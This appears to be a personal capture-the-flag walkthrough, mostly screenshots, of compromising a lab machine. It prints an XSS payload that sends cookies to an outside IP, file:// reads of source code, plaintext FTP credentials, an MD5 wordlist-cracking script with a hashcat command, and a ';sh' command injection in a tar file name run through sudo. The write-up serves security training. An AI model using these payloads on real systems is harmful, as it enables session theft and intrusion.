# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #xss #lfi #reverse_eng #log_var

# Findings

## External
### Enumeration

![](https://i.imgur.com/nG3PHms.png)
![](https://i.imgur.com/dseNtZo.png)
- ![](https://i.imgur.com/APqkjDM.png)

	- meaning those ppls will check it, so i can create exploit for this XSS,CSRF
	- ![](https://i.imgur.com/oAjX7lv.png)

	- ![](https://i.imgur.com/zMEEPAf.png)
### Gaining Access
- ![](https://i.imgur.com/clBs0bj.png)
- ![](https://i.imgur.com/oGKB6gN.png)
- `user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4`
- ![](https://i.imgur.com/BvnV64J.png)
- as you see the dashboard displays the report name lets check it
	- ![](https://i.imgur.com/O3rifnV.png)
	- i wrote the report title "rexder" and it worked.

![](https://i.imgur.com/nG3PHms.png)
- As it says if the bug requires attention it will be **escalated to the admin** 
	- So if i make a report and escalate it by giving priority level high it will be sent to the admin.
	- For this i need to think how i can get the id
		- ![](https://i.imgur.com/2yd33ES.png)
		- The Payload i used before wont work on this one, bc we dont need to redirect us while changing the priority
			- `<script>var i=new Image(); i.src="http://10.10.16.52/?cookie="+document.cookie;</script>`
- ![](https://i.imgur.com/Jg8bI2c.png)
![](https://i.imgur.com/bFHzU8x.png)
![](https://i.imgur.com/VAVjvVu.png)
![](https://i.imgur.com/x06cFNY.png)
![](https://i.imgur.com/CiFRWaW.png)
![](https://i.imgur.com/B5pcPwp.png)
`eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5`
![](https://i.imgur.com/60n196q.png)

- we got the `/create_pdf_report` on the admin dash board
![](https://i.imgur.com/ltHg2N8.png)

![](https://i.imgur.com/mxqZdPb.png)
![](https://i.imgur.com/rUZSdTO.png)
https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d
![](https://i.imgur.com/Dq022TV.png)
i used psedo file -` /proc/self/cmdline `
![](https://i.imgur.com/M38Txhr.png)
- The Pseudo File ,Contains the command and the file name which runs.
	- ![](https://i.imgur.com/2DYu25C.png)
- based on our finding there is `python3 app/code/app.py` command. so the `/app/code/app.py` is the code.
	- ![](https://i.imgur.com/VIZsV3j.png)
- ![](https://i.imgur.com/dkox0In.png)![](https://i.imgur.com/uTidaM1.png)
- I tried to access the modules used on the python code ( `blueprints/dashboard/dashboard.py`) ,and got more python codes.
	- file:///app/code/blueprints/dashboard/dashboard.py
![](https://i.imgur.com/BGj7B4R.png)
![](https://i.imgur.com/wPOlIga.png)

`ftp.local : ftp_admin: u3jai8y71s2`![](https://i.imgur.com/5D7Oi0i.png)![](https://i.imgur.com/4tSk207.png)
![](https://i.imgur.com/84J5BGy.png)


## Internal
### Enumeration
 ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key
![](https://i.imgur.com/oeNgQ5K.png)
- ` ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt`
	- ![](https://i.imgur.com/Sr23aaT.png)
`Y27SH19HDIWD`
### Gaining Access
- ![](https://i.imgur.com/ne594gC.png)
	- I got user name and also removed the passphrase 
- ![](https://i.imgur.com/IFgUa0g.png)
- ![](https://i.imgur.com/dPiczfH.png)

![](https://i.imgur.com/kdN3lEb.png)
- Cracked with Hashcat
	- ![](https://i.imgur.com/LEld3Vu.png)
- `adam : adam gray`
- ![](https://i.imgur.com/0c56thb.png)
- Doing local port forwarding and tryin port 4444 and 33641
	- `4444`
		- Tried to check it but as we know the xss executed automatically most of the tim that is done using headless browsers, one of them is selenium, so i skipped checking it.![](https://i.imgur.com/kuSFz1B.png)
	- `172.21.0.1:ftp` on dev_acc
		- ![](https://i.imgur.com/BbWl9xV.png)- ![](https://i.imgur.com/Q7fpv4j.png)
- ![](https://i.imgur.com/wv6lhhd.png)
- I though the password was thee `UH...` so i tried to finish that and i have also got MD5 Hash from the 
	- ![](https://i.imgur.com/QUzxz5B.png)
- The Code do comparing 
	- ![](https://i.imgur.com/b8336g1.png)
- So i can generate wordlist and crack the md5 `0feda17076d793c2ef2870d7427ad4ed`
```python
# Function to generate alphanumeric combinations
def generate_combinations():
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    for a in characters:
        for b in characters:
            for c in characters:
                for d in characters:
                    yield a + b + c + d

# Replace the asterisks with generated combinations
original_string = "UHI75GHI****"
combinations = generate_combinations()

# Generate the list of consecutive combinations
result_list = [original_string.replace("****", next(combinations)) for _ in range(10000000)]

# Save the generated list to a file
with open("result.txt", "w") as file:
    file.write('\n'.join(result_list))
```
- `hashcat -m 0 -a 0 0feda17076d793c2ef2870d7427ad4ed result.txt`
	- ![](https://i.imgur.com/XYEDK48.png)
`UHI75GHINKOP`
- ![](https://i.imgur.com/c8PzYn0.png)
![](https://i.imgur.com/6Yt2fpc.png)
- while enumertaing var file i got some readable files
	- ![](https://i.imgur.com/ByC8nAi.png)
- so i used grep it does work but i used zgrep for the gz files.
	- ![](https://i.imgur.com/PedOqjd.png)
	- ![](https://i.imgur.com/S1Ftj1N.png)
```json
suricata/eve.json.7.gz:12477:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}
```
- ` lopez : Lopezz1992%123 `
### Maintaining Access
![](https://i.imgur.com/QFWcdAJ.png)
![](https://i.imgur.com/ZD2yFDt.png)
- Reverse the runner2 with ghidra
	- ![](https://i.imgur.com/ZUYxvrf.png)
	- ![](https://i.imgur.com/wT7cxXm.png)
	- ![](https://i.imgur.com/TvrQVmf.png)
	- ![](https://i.imgur.com/hNQywlB.png)
	- ![](https://i.imgur.com/tR2HNaE.png)
	- ![](https://i.imgur.com/6j1XymU.png)
	- ![](https://i.imgur.com/FMew2Kq.png)
		- ![](https://i.imgur.com/oLyfbyv.png)
	- ![](https://i.imgur.com/CEWDXJw.png)
	- I made the hello file tar ![](https://i.imgur.com/FGkgysH.png)
		- ![](https://i.imgur.com/1azDVc6.png)
		- As you see it is displaying our filename, so i thought to use `;sh` on the name
		- ![](https://i.imgur.com/o8GAT1g.png)
	- ![](https://i.imgur.com/4U4QLlj.png)
- `echo '{"run":{"action": "install", "role_file": "/home/lopez/hello.tar;sh"}, "auth_code": "UHI75GHINKOP"}' > exploit`
- `sudo ./runner2 ~/exploit` 
![](https://i.imgur.com/4qtOWYo.png)

# Random Notes

╔══════════╣ Unexpected in /opt (usually empty)
total 28
drwxr-xr-x  7 root root  x 19 root root    4096 Apr 10 07:40 ..
drwx--x--x  4 root root    4096 Aug 26  2023 containerd
drwxr-xr-x  4 root root    4096 Sep 19  2023 ftp
drwxr-xr-x  3 root root    4096 Apr 10 08:21 google
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 playbooks
drwxr-x---  2 root sys-adm 4096 Apr 10 08:21 runner2


